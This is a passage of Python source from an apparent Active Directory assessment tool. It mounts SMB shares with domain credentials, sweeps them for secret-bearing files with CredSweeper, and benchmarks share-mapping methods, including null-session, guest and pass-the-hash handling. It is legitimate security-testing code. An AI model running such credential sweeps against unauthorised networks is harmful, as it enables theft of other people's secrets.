            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            f"CIFS artifact benchmark mount error: {type(exc).__name__}: {exc}"
        )

    if not os.path.isdir(effective_mount_root):
        return {"success": False}

    try:
        artifact_extensions = tuple(
            dict.fromkeys(
                get_sensitive_phase_extensions("direct_secret_artifacts")
                + get_sensitive_phase_extensions("heavy_artifacts")
            )
        )
        prepare_started = time.perf_counter()
        artifact_files = _iter_cifs_extension_candidate_files(
            mount_root=effective_mount_root,
            hosts=hosts,
            shares=shares,
            extensions=artifact_extensions,
            aggregate_map_path=aggregate_map_abs if use_mapping else None,
        )
        prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
        spidering_service = shell._get_spidering_service()
        artifact_tuning = choose_artifact_processing_tuning(file_count=len(artifact_files))
        print_info_debug(
            "Artifact benchmark tuning: "
            f"backend=cifs_candidate_paths files={len(artifact_files)} workers={artifact_tuning.workers}"
        )
        analysis_started = time.perf_counter()
        spidering_service.process_found_files_batch(
            artifact_files,
            domain,
            "ext",
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            enable_legacy_zip_callbacks=False,
            apply_actions=False,
            max_workers=artifact_tuning.workers,
        )
        analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"CIFS artifact benchmark unmount error: {type(exc).__name__}: {exc}"
            )

    return {
        "success": True,
        "candidate_files": len(artifact_files),
        "processed_files": len(artifact_files),
        "artifact_hits": len(artifact_files),
        "mapped_shares": int(len(shares)),
        "artifact_prepare_seconds": prepare_seconds,
        "artifact_analysis_seconds": analysis_seconds,
        "artifact_preview_values": _build_artifact_preview_values(artifact_files),
    }


def _run_cifs_full_mount_artifact_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    aggregate_map_path: str | None = None,
) -> dict[str, Any]:
    """Run CIFS artifact benchmark by reading from a mounted tree."""
    effective_mount_root = _resolve_cifs_mount_root(shell=shell, domain=domain)
    prepare_seconds = 0.0
    analysis_seconds = 0.0
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            f"CIFS full-mount artifact benchmark mount error: {type(exc).__name__}: {exc}"
        )

    if not os.path.isdir(effective_mount_root):
        return {"success": False}

    try:
        artifact_extensions = tuple(
            dict.fromkeys(
                get_sensitive_phase_extensions("direct_secret_artifacts")
                + get_sensitive_phase_extensions("heavy_artifacts")
            )
        )
        prepare_started = time.perf_counter()
        artifact_files = _iter_cifs_extension_candidate_files(
            mount_root=effective_mount_root,
            hosts=hosts,
            shares=shares,
            extensions=artifact_extensions,
            aggregate_map_path=str(aggregate_map_path or "").strip() or None,
        )
        prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
        spidering_service = shell._get_spidering_service()
        artifact_tuning = choose_artifact_processing_tuning(file_count=len(artifact_files))
        print_info_debug(
            "Artifact benchmark tuning: "
            f"backend=cifs_full_mount files={len(artifact_files)} workers={artifact_tuning.workers}"
        )
        analysis_started = time.perf_counter()
        spidering_service.process_found_files_batch(
            artifact_files,
            domain,
            "ext",
            source_hosts=hosts,
            source_shares=shares,
            auth_username=username,
            enable_legacy_zip_callbacks=False,
            apply_actions=False,
            max_workers=artifact_tuning.workers,
        )
        analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"CIFS full-mount artifact benchmark unmount error: {type(exc).__name__}: {exc}"
            )

    return {
        "success": True,
        "candidate_files": len(artifact_files),
        "processed_files": len(artifact_files),
        "artifact_hits": len(artifact_files),
        "mapped_shares": int(len(shares)),
        "artifact_prepare_seconds": prepare_seconds,
        "artifact_analysis_seconds": analysis_seconds,
        "artifact_preview_values": _build_artifact_preview_values(artifact_files),
    }


def _run_cifs_full_mount_credsweeper_benchmark(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
    share_map: dict[str, dict[str, str]] | None,
    benchmark_profile: str = DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    benchmark_scope: str = SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
    benchmark_execution_mode: str = "single_phase",
) -> dict[str, Any]:
    """Run native full-mount CredSweeper benchmark with internal parallelism."""
    if (
        benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED
        and benchmark_execution_mode == "production_sequenced"
    ):
        return _merge_credential_benchmark_results(
            [
                _run_timed_benchmark_phase(
                    phase_seconds_key="text_phase_seconds",
                    runner=lambda: _run_cifs_full_mount_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
                        benchmark_execution_mode="single_phase",
                    ),
                ),
                _run_timed_benchmark_phase(
                    phase_seconds_key="document_phase_seconds",
                    runner=lambda: _run_cifs_full_mount_credsweeper_benchmark(
                        shell=shell,
                        domain=domain,
                        shares=shares,
                        hosts=hosts,
                        username=username,
                        password=password,
                        share_map=share_map,
                        benchmark_profile=SMB_SENSITIVE_FILE_PROFILE_DOCUMENTS_ONLY,
                        benchmark_scope=SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY,
                        benchmark_execution_mode="single_phase",
                    ),
                ),
            ]
        )
    from adscan_internal.services.credsweeper_service import CredSweeperService

    if not getattr(shell, "credsweeper_path", None):
        print_warning("CredSweeper is not configured. Skipping CIFS full-mount benchmark.")
        return {"success": False}

    effective_mount_root = _resolve_cifs_mount_root(shell=shell, domain=domain)
    mount_targets = _resolve_cifs_host_share_targets(
        hosts=hosts,
        shares=shares,
        share_map=share_map,
    )
    mounted_points: list[str] = []
    try:
        mounted_points = _mount_cifs_targets_via_host_helper(
            domain=domain,
            username=username,
            password=password,
            mount_root=effective_mount_root,
            targets=mount_targets,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            f"CIFS full-mount benchmark mount error: {type(exc).__name__}: {exc}"
        )

    if not os.path.isdir(effective_mount_root):
        return {"success": False}

    credsweeper_service = (
        shell._get_credsweeper_service()
        if callable(getattr(shell, "_get_credsweeper_service", None))
        else CredSweeperService(shell.run_command)
    )
    artifacts_dir = _resolve_credsweeper_artifacts_dir(
        shell=shell,
        domain=domain,
        purpose="sensitive_benchmark_cifs_full_mount",
    )
    prepare_started = time.perf_counter()
    candidate_files = _count_files_under_path_with_extensions(
        effective_mount_root,
        extensions=get_sensitive_file_extensions(benchmark_profile),
    )
    prepare_seconds = max(0.0, time.perf_counter() - prepare_started)
    jobs = _resolve_credsweeper_benchmark_jobs()
    print_info_debug(
        "Running native full-mount CredSweeper benchmark: "
        f"mount_root={mark_sensitive(effective_mount_root, 'path')} jobs={jobs} "
        f"profile={benchmark_profile}"
    )

    try:
        analysis_started = time.perf_counter()
        findings = _run_credsweeper_benchmark_path_scan(
            credsweeper_service=credsweeper_service,
            credsweeper_path=shell.credsweeper_path,
            path_to_scan=effective_mount_root,
            json_output_dir=artifacts_dir,
            benchmark_scope=benchmark_scope,
            jobs=jobs,
            find_by_ext=False,
        )
        analysis_seconds = max(0.0, time.perf_counter() - analysis_started)
    finally:
        try:
            _unmount_cifs_targets_via_host_helper(mount_points=mounted_points)
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"CIFS full-mount benchmark unmount error: {type(exc).__name__}: {exc}"
            )

    total_findings, files_with_findings = _count_grouped_credential_findings(findings)
    timing_key_prefix = (
        "document"
        if benchmark_scope == SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY
        else "text"
    )
    return {
        "success": True,
        "candidate_files": int(candidate_files),
        "scanned_files": int(candidate_files),
        "files_with_findings": int(files_with_findings),
        "credential_like_findings": int(total_findings),
        "mapped_shares": int(len(shares)),
        f"{timing_key_prefix}_prepare_seconds": prepare_seconds,
        f"{timing_key_prefix}_analysis_seconds": analysis_seconds,
        "credential_preview_values": _build_grouped_credential_preview(findings),
    }


def _count_files_under_path(root_path: str) -> int:
    """Count visible files under a local directory tree."""
    total = 0
    root = Path(root_path)
    for dirpath, dirnames, filenames in os.walk(root_path):
        prune_excluded_walk_dirs(dirnames)
        base_dir = Path(dirpath)
        for filename in filenames:
            file_path = base_dir / filename
            try:
                relative_path = file_path.relative_to(root).as_posix()
            except ValueError:
                continue
            if is_globally_excluded_smb_relative_path(relative_path):
                continue
            total += 1
    return total


def _list_files_under_path(root_path: str) -> list[str]:
    """Return stable file list under one local directory tree."""
    files: list[str] = []
    root = Path(root_path)
    for dirpath, dirnames, filenames in os.walk(root_path):
        prune_excluded_walk_dirs(dirnames)
        for filename in sorted(filenames):
            file_path = Path(dirpath) / filename
            try:
                relative_path = file_path.relative_to(root).as_posix()
            except ValueError:
                continue
            if is_globally_excluded_smb_relative_path(relative_path):
                continue
            files.append(str(file_path))
    return files


def _build_artifact_preview_values(
    file_paths: list[str],
    *,
    limit: int = 3,
) -> list[str]:
    """Return a compact deduplicated preview of artifact filenames."""
    preview: list[str] = []
    seen: set[str] = set()
    for file_path in file_paths:
        name = Path(file_path).name.strip()
        if not name:
            continue
        key = name.casefold()
        if key in seen:
            continue
        seen.add(key)
        preview.append(name)
        if len(preview) >= limit:
            break
    return preview


def _resolve_credsweeper_benchmark_jobs() -> int:
    """Return a conservative parallelism level for native CredSweeper benchmarks."""
    return get_default_credsweeper_jobs()


def run_smb_map_benchmark_history(
    shell: Any,
    *,
    domain: str,
    recent_limit: int = 10,
    days: int | None = None,
    csv_output_path: str | None = None,
) -> None:
    """Render historical SMB mapping benchmark comparison from persisted JSON."""
    from adscan_internal.workspaces import read_json_file

    workspace_cwd = shell._get_workspace_cwd()
    history_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "history.json",
    )
    history_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "history.json",
    )
    if not os.path.exists(history_abs):
        marked_history_rel = mark_sensitive(history_rel, "path")
        print_warning(
            "No SMB mapping benchmark history found yet. "
            f"Expected file: {marked_history_rel}"
        )
        return

    payload = read_json_file(history_abs)
    runs = payload.get("runs", [])
    if not isinstance(runs, list) or not runs:
        marked_history_rel = mark_sensitive(history_rel, "path")
        print_info(f"SMB mapping benchmark history is empty in {marked_history_rel}.")
        return

    safe_limit = max(1, min(int(recent_limit), 100))
    sorted_runs_all = sorted(
        (item for item in runs if isinstance(item, dict)),
        key=lambda item: str(item.get("created_at", "")),
        reverse=True,
    )
    filtered_runs = sorted_runs_all
    if days is not None:
        safe_days = max(1, int(days))
        cutoff = datetime.now(timezone.utc) - timedelta(days=safe_days)
        day_filtered_runs: list[dict[str, Any]] = []
        for entry in sorted_runs_all:
            created_at = _parse_history_created_at(entry)
            if created_at is None:
                continue
            if created_at >= cutoff:
                day_filtered_runs.append(entry)
        filtered_runs = day_filtered_runs
        print_info_debug(
            "SMB benchmark history day filter applied: "
            f"days={safe_days} runs_before={len(sorted_runs_all)} "
            f"runs_after={len(filtered_runs)}"
        )

    if not filtered_runs:
        print_warning(
            "No SMB mapping benchmark runs match the selected filter criteria."
        )
        return

    recent_runs = filtered_runs[:safe_limit]

    history_table = Table(
        title="[bold cyan]SMB Mapping Benchmark History[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    history_table.add_column("#", style="cyan", justify="right")
    history_table.add_column("Run ID", style="cyan")
    history_table.add_column("When (UTC)", style="magenta")
    history_table.add_column("Methods", style="yellow")
    history_table.add_column("Fastest", style="green")
    history_table.add_column("Duration (s)", style="green", justify="right")
    history_table.add_column("Success", style="blue", justify="right")

    for idx, entry in enumerate(recent_runs, start=1):
        run_id = str(entry.get("run_id", "") or "-")
        created_at = str(entry.get("created_at", "") or "-")
        selected_methods = entry.get("selected_methods", [])
        if isinstance(selected_methods, list):
            rendered_methods = ", ".join(str(method) for method in selected_methods[:4])
            if len(selected_methods) > 4:
                rendered_methods += ", ..."
            rendered_methods = rendered_methods or "-"
        else:
            rendered_methods = "-"
        fastest_method = str(entry.get("fastest_successful_method", "") or "-")
        fastest_duration = entry.get("fastest_successful_duration_seconds")
        duration_text = (
            f"{float(fastest_duration):.3f}"
            if isinstance(fastest_duration, (int, float))
            else "-"
        )
        success_count = int(entry.get("success_count", 0) or 0)
        results_count = int(entry.get("results_count", 0) or 0)
        history_table.add_row(
            str(idx),
            run_id,
            created_at,
            rendered_methods,
            fastest_method,
            duration_text,
            f"{success_count}/{results_count}",
        )

    print_panel_with_table(history_table, border_style=BRAND_COLORS["info"])

    method_stats = _summarize_benchmark_method_stats(
        shell=shell,
        runs=filtered_runs,
        workspace_cwd=workspace_cwd,
    )
    if not method_stats:
        print_warning(
            "No per-method benchmark statistics could be derived from history."
        )
        return

    stats_table = Table(
        title="[bold cyan]SMB Mapping Benchmark Method Summary[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    stats_table.add_column("Method", style="cyan")
    stats_table.add_column("Runs", style="magenta", justify="right")
    stats_table.add_column("Success", style="blue", justify="right")
    stats_table.add_column("Success %", style="yellow", justify="right")
    stats_table.add_column("Avg Success (s)", style="green", justify="right")
    stats_table.add_column("Best Success (s)", style="green", justify="right")

    for method, stats in sorted(
        method_stats.items(),
        key=lambda item: item[1]["avg_success_seconds"]
        if item[1]["avg_success_seconds"] is not None
        else 10_000_000.0,
    ):
        success_rate = (
            (stats["successes"] / stats["runs"]) * 100.0 if stats["runs"] > 0 else 0.0
        )
        avg_text = (
            f"{float(stats['avg_success_seconds']):.3f}"
            if isinstance(stats["avg_success_seconds"], (int, float))
            else "-"
        )
        best_text = (
            f"{float(stats['best_success_seconds']):.3f}"
            if isinstance(stats["best_success_seconds"], (int, float))
            else "-"
        )
        stats_table.add_row(
            method,
            str(int(stats["runs"])),
            str(int(stats["successes"])),
            f"{success_rate:.1f}",
            avg_text,
            best_text,
        )

    print_panel_with_table(stats_table, border_style=BRAND_COLORS["info"])
    if csv_output_path is not None:
        _export_smb_mapping_benchmark_history_csv(
            shell=shell,
            domain=domain,
            runs=filtered_runs,
            workspace_cwd=workspace_cwd,
            csv_output_path=csv_output_path,
        )


def _summarize_benchmark_method_stats(
    *,
    shell: Any,
    runs: list[dict[str, Any]],
    workspace_cwd: str,
) -> dict[str, dict[str, Any]]:
    """Compute per-method benchmark stats across persisted run history."""
    method_durations: dict[str, list[float]] = {}
    method_successes: dict[str, int] = {}
    method_runs: dict[str, int] = {}

    for entry in runs:
        method_results = _resolve_history_method_results(
            entry=entry,
            workspace_cwd=workspace_cwd,
        )

        for result in method_results:
            method = str(result.get("method", "") or "").strip()
            if not method:
                continue
            success = bool(result.get("success"))
            duration = float(result.get("duration_seconds", 0.0) or 0.0)
            method_runs[method] = int(method_runs.get(method, 0)) + 1
            if success:
                method_successes[method] = int(method_successes.get(method, 0)) + 1
                method_durations.setdefault(method, []).append(max(0.0, duration))

    stats: dict[str, dict[str, Any]] = {}
    for method, runs_count in method_runs.items():
        durations = method_durations.get(method, [])
        avg_success = (sum(durations) / len(durations)) if durations else None
        best_success = min(durations) if durations else None
        stats[method] = {
            "runs": int(runs_count),
            "successes": int(method_successes.get(method, 0)),
            "avg_success_seconds": avg_success,
            "best_success_seconds": best_success,
        }
    return stats


def _resolve_history_method_results(
    *,
    entry: dict[str, Any],
    workspace_cwd: str,
) -> list[dict[str, Any]]:
    """Resolve normalized per-method results for one history entry."""
    from adscan_internal.workspaces import read_json_file

    method_results = entry.get("method_results", [])
    if isinstance(method_results, list) and method_results:
        return _normalize_benchmark_method_results(method_results)

    run_file_rel = str(entry.get("run_file", "") or "").strip()
    if not run_file_rel:
        return []
    run_file_abs = os.path.join(workspace_cwd, run_file_rel)
    if not os.path.exists(run_file_abs):
        return []
    run_payload = read_json_file(run_file_abs)
    raw_results = run_payload.get("results", [])
    if not isinstance(raw_results, list):
        return []
    return _normalize_benchmark_method_results(raw_results)


def _parse_history_created_at(entry: dict[str, Any]) -> datetime | None:
    """Parse one history entry ``created_at`` into timezone-aware datetime."""
    created_at_text = str(entry.get("created_at", "") or "").strip()
    if not created_at_text:
        return None
    normalized = created_at_text.replace("Z", "+00:00")
    try:
        parsed = datetime.fromisoformat(normalized)
    except Exception:
        return None
    if parsed.tzinfo is None:
        return parsed.replace(tzinfo=timezone.utc)
    return parsed.astimezone(timezone.utc)


def _export_smb_mapping_benchmark_history_csv(
    *,
    shell: Any,
    domain: str,
    runs: list[dict[str, Any]],
    workspace_cwd: str,
    csv_output_path: str | None,
) -> None:
    """Export filtered benchmark history into CSV (one row per method result)."""
    output_rel, output_abs = _resolve_benchmark_csv_output_path(
        shell=shell,
        domain=domain,
        workspace_cwd=workspace_cwd,
        csv_output_path=csv_output_path,
    )
    rows: list[dict[str, Any]] = []
    for entry in runs:
        method_results = _resolve_history_method_results(
            entry=entry,
            workspace_cwd=workspace_cwd,
        )
        for result in method_results:
            rows.append(
                {
                    "run_id": str(entry.get("run_id", "") or ""),
                    "created_at": str(entry.get("created_at", "") or ""),
                    "principal": str(entry.get("principal", "") or ""),
                    "hosts_count": int(entry.get("hosts_count", 0) or 0),
                    "shares_count": int(entry.get("shares_count", 0) or 0),
                    "method": str(result.get("method", "") or ""),
                    "success": bool(result.get("success")),
                    "duration_seconds": float(
                        result.get("duration_seconds", 0.0) or 0.0
                    ),
                }
            )

    fieldnames = [
        "run_id",
        "created_at",
        "principal",
        "hosts_count",
        "shares_count",
        "method",
        "success",
        "duration_seconds",
    ]
    try:
        os.makedirs(os.path.dirname(output_abs), exist_ok=True)
        with open(output_abs, "w", encoding="utf-8", newline="") as handle:
            writer = csv.DictWriter(handle, fieldnames=fieldnames)
            writer.writeheader()
            writer.writerows(rows)
        marked_output = mark_sensitive(output_rel, "path")
        print_info(f"SMB benchmark history CSV exported to {marked_output}.")
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning("SMB benchmark history CSV export failed.")
        print_warning_debug(
            f"SMB benchmark history CSV export error: {type(exc).__name__}: {exc}"
        )


def _resolve_benchmark_csv_output_path(
    *,
    shell: Any,
    domain: str,
    workspace_cwd: str,
    csv_output_path: str | None,
) -> tuple[str, str]:
    """Resolve benchmark CSV output as (workspace-relative, absolute)."""
    if csv_output_path:
        candidate = str(csv_output_path).strip()
        if os.path.isabs(candidate):
            output_abs = candidate
            output_rel = os.path.relpath(candidate, workspace_cwd)
        else:
            output_rel = candidate
            output_abs = os.path.join(workspace_cwd, candidate)
        return output_rel, output_abs

    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    filename = f"history_{timestamp}.csv"
    output_rel = domain_relpath(
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "mapping_benchmark",
        "exports",
        filename,
    )
    output_abs = os.path.join(workspace_cwd, output_rel)
    return output_rel, output_abs


def _build_spider_plus_auth(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> str:
    """Build NetExec auth args for spider_plus based on the current session."""
    lowered = username.strip().lower()
    if lowered == "null":
        return '-u "" -p ""'
    if is_guest_alias(lowered) and password == "":
        return _build_guest_auth_nxc(shell, domain=domain)
    return shell.build_auth_nxc(username, password, domain)


def _resolve_rclone_transport_auth(
    shell: Any,
    *,
    domain: str,
    username: str,
    password: str,
) -> tuple[str, str, str]:
    """Resolve the effective SMB auth context for rclone backends.

    ``rclone`` null sessions must omit all auth fields from the SMB remote, so
    this returns empty transport credentials/domain for logical ``null``.
    Guest sessions keep an empty password but switch to the configured guest
    transport username shared with the rest of the SMB stack.
    """
    normalized_username = str(username or "").strip()
    normalized_password = str(password or "")
    lowered_username = normalized_username.lower()
    if lowered_username == "null":
        return "null", "", ""
    if is_guest_alias(lowered_username) and normalized_password == "":
        return resolve_smb_guest_username(shell=shell, domain=domain), "", domain
    return normalized_username, normalized_password, domain


def _is_null_session_smb_auth(
    shell: Any,
    *,
    domain: str | None,
    username: str | None,
) -> bool:
    """Return True when the effective SMB auth context is a null session."""
    normalized_username = str(username or "").strip().lower()
    if normalized_username == "null":
        return True
    if normalized_username:
        return False
    if domain and isinstance(getattr(shell, "domains_data", None), dict):
        domain_auth = str(
            shell.domains_data.get(domain, {}).get("auth", "")  # type: ignore[index]
            or ""
        ).strip().lower()
        return domain_auth == "null"
    return False


def _normalize_sensitive_data_method_for_smb_auth(
    shell: Any,
    *,
    domain: str | None,
    username: str | None,
    password: str | None = None,
    selected_method: str | None,
) -> str | None:
    """Normalize unsupported SMB analysis methods for the current auth context."""
    def _classify_unsupported_auth() -> str:
        if _is_null_session_smb_auth(shell, domain=domain, username=username):
            return "null_session"
        if password and callable(getattr(shell, "is_hash", None)) and shell.is_hash(password):
            return "hash"
        return "supported"

    def _describe_method(method: str) -> str:
        labels = {
            "ai_rclone": "AI-assisted rclone mapping",
            "ai": "AI-assisted spider_plus mapping",
            "deterministic_rclone_direct": "deterministic rclone direct analysis",
            "deterministic_rclone_mapped": "deterministic rclone mapped analysis",
            "deterministic_manspider": "deterministic manspider analysis",
        }
        return labels.get(method, method)

    def _announce_once(original_method: str, normalized_method: str, reason: str) -> None:
        cache = getattr(shell, "_smb_sensitive_auth_normalization_notices", None)
        if not isinstance(cache, set):
            cache = set()
            setattr(shell, "_smb_sensitive_auth_normalization_notices", cache)
        notice_key = (
            str(domain or "").strip().lower(),
            str(original_method).strip(),
            str(normalized_method).strip(),
        )
        if notice_key in cache:
            return
        cache.add(notice_key)
        marked_domain = mark_sensitive(str(domain or "unknown"), "domain")
        marked_original = mark_sensitive(_describe_method(original_method), "text")
        marked_normalized = mark_sensitive(_describe_method(normalized_method), "text")
        auth_kind = _classify_unsupported_auth()
        print_info_debug(
            "SMB auth compatibility fallback selected: "
            f"domain={marked_domain} auth_kind={mark_sensitive(auth_kind, 'text')} "
            f"requested_method={marked_original} normalized_method={marked_normalized} "
            f"reason={mark_sensitive(reason, 'text')}"
        )
        telemetry.capture(
            "smb_sensitive_auth_normalized",
            {
                "domain": str(domain or "").strip().lower() or "unknown",
                "auth_kind": auth_kind,
                "requested_method": str(original_method).strip(),
                "normalized_method": str(normalized_method).strip(),
                "reason": reason,
                "workspace_type": str(getattr(shell, "type", "") or "").strip().lower()
                or "unknown",
                "auto_mode": bool(getattr(shell, "auto", False)),
            },
        )
        print_info(
            f"{reason} Using {marked_normalized} instead of {marked_original} "
            f"for domain {marked_domain}."
        )

    normalized_method = str(selected_method or "").strip()
    if not normalized_method:
        return selected_method
    unsupported_reason = _get_rclone_unsupported_smb_auth_reason(
        shell,
        domain=domain,
        username=username,
        password=password,
    )
    if not unsupported_reason:
        return selected_method
    if normalized_method == "ai_rclone":
        _announce_once(
            "ai_rclone",
            "ai",
            unsupported_reason,
        )
        return "ai"
    if normalized_method in {
        "deterministic_rclone_direct",
        "deterministic_rclone_mapped",
    }:
        _announce_once(
            normalized_method,
            "deterministic_manspider",
            unsupported_reason,
        )
        return "deterministic_manspider"
    return selected_method


def _is_rclone_supported_for_smb_auth(
    shell: Any,
    *,
    domain: str | None,
    username: str | None,
    password: str | None = None,
) -> bool:
    """Return True when rclone SMB backend supports the requested auth mode."""
    if _is_null_session_smb_auth(shell, domain=domain, username=username):
        return False
    if password and callable(getattr(shell, "is_hash", None)) and shell.is_hash(password):
        return False
    return True


def _get_rclone_unsupported_smb_auth_reason(
    shell: Any,
    *,
    domain: str | None,
    username: str | None,
    password: str | None = None,
) -> str:
    """Return one user-facing reason when rclone SMB cannot use the current auth material."""
    if _is_null_session_smb_auth(shell, domain=domain, username=username):
        return "SMB null-session auth is not supported by the rclone SMB backend."
    if password and callable(getattr(shell, "is_hash", None)) and shell.is_hash(password):
        return (
            "rclone SMB does not support pass-the-hash / NTLM-hash authentication; "
            "it requires a plaintext password for the inline SMB remote."
        )
    return ""


def _slugify_token(token: str) -> str:
    """Return a filesystem-safe token for output folder naming."""
    slug = re.sub(r"[^a-zA-Z0-9_.-]+", "_", token or "").strip("_")
    return slug or "unknown"


def _resolve_cifs_mount_root(
    *,
    shell: Any,
    domain: str,
) -> str:
    """Resolve CIFS mount root path from shell/env/default workspace path."""
    configured_root = str(getattr(shell, "smb_cifs_mount_root", "") or "").strip()
    env_root = os.getenv("ADSCAN_SMB_CIFS_MOUNT_ROOT", "").strip()
    workspace_cwd = shell._get_workspace_cwd()
    default_root = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "mounts",
    )

    for candidate in [configured_root, env_root, default_root]:
        if not candidate:
            continue
        if os.path.isdir(candidate):
            return os.path.abspath(candidate)
    return os.path.abspath(configured_root or env_root or default_root)


def _resolve_cifs_aggregate_map_path(
    *,
    shell: Any,
    domain: str,
) -> str:
    """Resolve the consolidated CIFS mapping JSON path for one domain."""
    workspace_cwd = shell._get_workspace_cwd()
    return domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "cifs",
        "share_tree_map.json",
    )


def _resolve_cifs_host_share_targets(
    *,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None,
) -> list[tuple[str, str]]:
    """Resolve host/share targets for CIFS mount attempts."""
    targets: list[tuple[str, str]] = []
    seen: set[tuple[str, str]] = set()

    if isinstance(share_map, dict):
        for host, host_shares in share_map.items():
            host_name = str(host or "").strip()
            if not host_name or not isinstance(host_shares, dict):
                continue
            for share, perms in host_shares.items():
                share_name = str(share or "").strip()
                perms_text = str(perms or "").strip().lower()
                if (
                    not share_name
                    or _is_globally_excluded_mapping_share(share_name)
                    or "read" not in perms_text
                ):
                    continue
                key = (host_name.lower(), share_name.lower())
                if key in seen:
                    continue
                seen.add(key)
                targets.append((host_name, share_name))

    if targets:
        return targets

    for host in hosts:
        host_name = str(host or "").strip()
        if not host_name:
            continue
        for share in shares:
            share_name = str(share or "").strip()
            if not share_name or _is_globally_excluded_mapping_share(share_name):
                continue
            key = (host_name.lower(), share_name.lower())
            if key in seen:
                continue
            seen.add(key)
            targets.append((host_name, share_name))
    return targets


def _mount_cifs_targets_via_host_helper(
    *,
    domain: str,
    username: str,
    password: str,
    mount_root: str,
    targets: list[tuple[str, str]],
) -> list[str]:
    """Best-effort CIFS share mounts via host-helper; returns mountpoints to cleanup."""
    helper_sock = os.getenv("ADSCAN_HOST_HELPER_SOCK", "").strip()
    if not helper_sock or not os.path.exists(helper_sock):
        marked_sock = mark_sensitive(helper_sock or "<unset>", "path")
        print_info_debug(
            f"CIFS host-helper mount skipped: missing helper socket ({marked_sock})."
        )
        return []

    try:
        from adscan_internal.host_privileged_helper import host_helper_client_request
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_warning_debug(
            "CIFS host-helper mount skipped: could not import host helper client."
        )
        return []

    mounted_points: list[str] = []
    mounted_count = 0
    already_mounted_count = 0
    mounted_new_count = 0
    reused_same_identity_count = 0
    reused_existing_mount_count = 0
    remounted_due_to_identity_change_count = 0
    failed_count = 0

    for host, share in targets:
        marked_host = mark_sensitive(host, "hostname")
        marked_share = mark_sensitive(share, "service")
        try:
            resp = host_helper_client_request(
                helper_sock,
                op="cifs_mount_share",
                payload={
                    "host": host,
                    "share": share,
                    "mount_root": mount_root,
                    "username": username,
                    "password": password,
                    "domain": domain,
                    "read_only": True,
                },
                timeout_seconds=180,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            failed_count += 1
            print_warning_debug(
                "CIFS host-helper mount request failed: "
                f"host={marked_host} share={marked_share} "
                f"error={type(exc).__name__}: {exc}"
            )
            continue
        if not resp.ok:
            failed_count += 1
            print_warning_debug(
                "CIFS host-helper mount failed: "
                f"host={marked_host} share={marked_share} "
                f"message={resp.message or '-'} rc={resp.returncode}"
            )
            continue

        mount_point = ""
        mounted_by_helper = False
        reuse_status = ""
        remounted_due_to_identity_change = False
        try:
            payload = json.loads(resp.stdout or "{}")
            mount_point = str(payload.get("mount_point", "")).strip()
            mounted_by_helper = bool(payload.get("mounted_by_helper", False))
            reuse_status = str(payload.get("reuse_status", "") or "").strip()
            remounted_due_to_identity_change = bool(
                payload.get("remounted_due_to_identity_change", False)
            )
        except Exception:
            mount_point = ""
            mounted_by_helper = False
            reuse_status = ""
            remounted_due_to_identity_change = False

        if mounted_by_helper and mount_point:
            mounted_count += 1
            mounted_points.append(mount_point)
            marked_mount_point = mark_sensitive(mount_point, "path")
            if remounted_due_to_identity_change:
                remounted_due_to_identity_change_count += 1
                print_info_debug(
                    "CIFS host-helper remounted share due to auth context change: "
                    f"host={marked_host} share={marked_share} "
                    f"mount_point={marked_mount_point}"
                )
            else:
                mounted_new_count += 1
                print_info_debug(
                    "CIFS host-helper mounted new share: "
                    f"host={marked_host} share={marked_share} "
